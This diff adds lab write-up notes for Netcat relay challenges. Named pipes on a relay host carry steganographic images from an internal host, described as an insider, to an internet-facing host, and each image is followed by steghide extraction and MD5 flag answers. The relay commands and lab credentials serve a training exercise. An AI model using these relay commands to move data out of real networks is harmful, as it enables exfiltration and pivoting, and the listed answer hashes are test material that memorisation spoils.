@@ -1950,10 +1950,184 @@ Challenge | Level: 1
           | ✅ Final Answer:  
           |     **red-int-dmz2-host-2**
 
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Title: Networking - 4 - Movement and Redirection
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                  Title: Networking - 4 - Movement and Redirection – Task 1 – Netcat Relay
+-----------------------------------------------------------------------------------------------------------------------------------------
+          | Section Overview – Netcat Relays and Steganographic Extraction  
+Challenge | Level: 2  
+          | Points: 40 (10 points per relay)  
+          | Prompt:  
+          |     "Utilize the targets T2 and RELAY to develop Netcat relays for use by Gorgan Cyber Forces.  
+          |      Named pipes must be used on RELAY to facilitate the transfer of steganographic image files to T1.  
+          |      Once each image is received on T1, extract the hidden message using the steghide tool.  
+          |      Syntax: `steghide extract -sf [image name]`  
+          |      Passphrase: `password`  
+          |      Then, generate a flag using: `cat [phraseX.txt] | md5sum`  
+          |      Each image has a known expected file size for verification."  
+
+          | Hosts Involved:  
+          |     - T2 (Sender): 172.16.82.115  
+          |     - RELAY (Middle): 172.16.40.10  
+          |     - T1 (Receiver): 10.10.0.40  
+
+          | Credentials:  
+          |     - RELAY & T1: student / password  
+
+          | File Transfers:  
+          |     - Relay 1: 1steg.jpg → Port 1234 → Size: 89824 bytes  
+          |     - Relay 2: 2steg.jpg → Port 4321 → Size: 70723 bytes  
+          |     - Relay 3: 3steg.jpg ← Port 6789 (T2 listens)  
+          |     - Relay 4: 4steg.jpg ← Port 9876 (T2 listens)  
+
+          | Requirements:  
+          |     - Use Netcat with named pipes on RELAY  
+          |     - Ensure correct port forwarding  
+          |     - Verify file size on T1  
+          |     - Extract hidden message using steghide  
+          |     - Generate MD5 hash of extracted message as final flag  
 
 -----------------------------------------------------------------------------------------------------------------------------------------
                                              Title: Networking - 4 - Movement and Redirection
 -----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Question 1 – Netcat Relay T1  
+Challenge | Level: 2  
+          | Points: 10  
+          | Prompt:  
+          |     "Transfer the image file 1steg.jpg from T2 to T1 using RELAY and named pipes.  
+          |      Extract the hidden message and generate flag1 using md5sum."  
+
+          | Steps Taken:  
+          |     1. Identified host roles and IPs:  
+          |         → T2 = BLUE_HOST-4 (172.16.82.115)  
+          |         → RELAY = BLUE_INT_DMZ_HOST-1 (172.16.40.10)  
+          |         → T1 = INTERNET_HOST (10.10.0.40)  
+          |     2. On T1:  
+          |         → Ran: `nc -lvp 9999 > 1steg.jpg`  
+          |     3. On RELAY:  
+          |         → Ran: `mknod mypipe p`  
+          |         → Ran: `nc -lvp 1234 < mypipe | nc 10.10.0.40 9999 > mypipe`  
+          |     4. Insider on T2 sent the file:  
+          |         → `nc 172.16.40.10 1234 < 1steg.jpg`  
+          |     5. Verified file on T1:  
+          |         → `ls -lh 1steg.jpg` → Size: 89824 bytes  
+          |     6. Extracted hidden message:  
+          |         → `steghide extract -sf 1steg.jpg`  
+          |         → Passphrase: `password`  
+          |     7. Generated MD5 hash:  
+          |         → `cat phrase1.txt | md5sum`  
+          |         → Output: `6abd7feac505f1384e6f98e3d1e8ba95`  
+
+          | ✅ Final Answer:  
+          |     **6abd7feac505f1384e6f98e3d1e8ba95**
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Title: Networking - 4 - Movement and Redirection
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Question 2 – Netcat Relay T2  
+Challenge | Level: 2  
+          | Points: 10  
+          | Prompt:  
+          |     "Transfer the image file 2steg.jpg from T2 to T1 using RELAY and named pipes.  
+          |      Extract the hidden message and generate flag2 using md5sum."  
+
+          | Steps Taken:  
+          |     1. Identified host roles and IPs:  
+          |         → T2 = BLUE_HOST-4 (172.16.82.115)  
+          |         → RELAY = BLUE_INT_DMZ_HOST-1 (172.16.40.10)  
+          |         → T1 = INTERNET_HOST (10.10.0.40)  
+          |     2. On T1:  
+          |         → Ran: `nc -lvp 9998 > 2steg.jpg`  
+          |     3. On RELAY:  
+          |         → Ran: `mknod mypipe2 p`  
+          |         → Ran: `nc -lvp 4321 < mypipe2 | nc 10.10.0.40 9998 > mypipe2`  
+          |     4. Insider on T2 sent the file:  
+          |         → `nc 172.16.40.10 4321 < 2steg.jpg`  
+          |     5. Verified file on T1:  
+          |         → `ls -lh 2steg.jpg` → Size: 70723 bytes  
+          |     6. Extracted hidden message:  
+          |         → `steghide extract -sf 2steg.jpg`  
+          |         → Passphrase: `password`  
+          |     7. Generated MD5 hash:  
+          |         → `cat phrase2.txt | md5sum`  
+          |         → Output: `024a1256e6f2ac6f08d2ccca2c3ba2a1`  
+
+          | ✅ Final Answer:  
+          |     **024a1256e6f2ac6f08d2ccca2c3ba2a1**
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Title: Networking - 4 - Movement and Redirection
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Question 3 – Netcat Relay T3  
+Challenge | Level: 2  
+          | Points: 10  
+          | Prompt:  
+          |     "Transfer the image file 3steg.jpg from T2 to T1 using RELAY and named pipes.  
+          |      T2 is listening for a connection from RELAY on TCP port 6789.  
+          |      Extract the hidden message and generate flag3 using md5sum."  
+
+          | Steps Taken:  
+          |     1. Identified host roles and IPs:  
+          |         → T2 = BLUE_HOST-4 (172.16.82.115)  
+          |         → RELAY = BLUE_INT_DMZ_HOST-1 (172.16.40.10)  
+          |         → T1 = INTERNET_HOST (10.10.0.40)  
+          |     2. On T1:  
+          |         → Ran: `nc -lvp 9997 > 3steg.jpg`  
+          |     3. On RELAY:  
+          |         → Ran: `mknod mypipe3 p`  
+          |         → Ran: `nc 172.16.82.115 6789 < mypipe3 | nc 10.10.0.40 9997 > mypipe3`  
+          |     4. Verified file on T1:  
+          |         → `ls -lh 3steg.jpg` → Size: 177444 bytes  
+          |     5. Extracted hidden message:  
+          |         → `steghide extract -sf 3steg.jpg`  
+          |         → Passphrase: `password`  
+          |     6. Generated MD5 hash:  
+          |         → `cat phrase3.txt | md5sum`  
+          |         → Output: `6fb3afb3a172f3605551c4ac05168a0c`  
+
+          | ✅ Final Answer:  
+          |     **6fb3afb3a172f3605551c4ac05168a0c**
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Title: Networking - 4 - Movement and Redirection
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Question 4 – Netcat Relay T4  
+Challenge | Level: 2  
+          | Points: 10  
+          | Prompt:  
+          |     "Transfer the image file 4steg.jpg from T2 to T1 using RELAY and named pipes.  
+          |      T2 is listening for a connection from RELAY on TCP port 9876.  
+          |      Extract the hidden message and generate flag4 using md5sum."  
+
+          | Steps Taken:  
+          |     1. Identified host roles and IPs:  
+          |         → T2 = BLUE_HOST-4 (172.16.82.115)  
+          |         → RELAY = BLUE_INT_DMZ_HOST-1 (172.16.40.10)  
+          |         → T1 = INTERNET_HOST (10.10.0.40)  
+          |     2. On T1:  
+          |         → Ran: `nc -lvp 9996 > 4steg.jpg`  
+          |     3. On RELAY:  
+          |         → Ran: `mknod mypipe4 p`  
+          |         → Ran: `nc 172.16.82.115 9876 < mypipe4 | nc 10.10.0.40 9996 > mypipe4`  
+          |     4. Verified file on T1:  
+          |         → `ls -lh 4steg.jpg` → Size: 204283 bytes  
+          |     5. Extracted hidden message:  
+          |         → `steghide extract -sf 4steg.jpg`  
+          |         → Passphrase: `password`  
+          |     6. Generated MD5 hash:  
+          |         → `cat phrase4.txt | md5sum`  
+          |         → Output: `378ee6771aa1cbd9653479bfc7db819e`  
+
+          | ✅ Final Answer:  
+          |     **378ee6771aa1cbd9653479bfc7db819e**
+
+
+
 
 
 -----------------------------------------------------------------------------------------------------------------------------------------
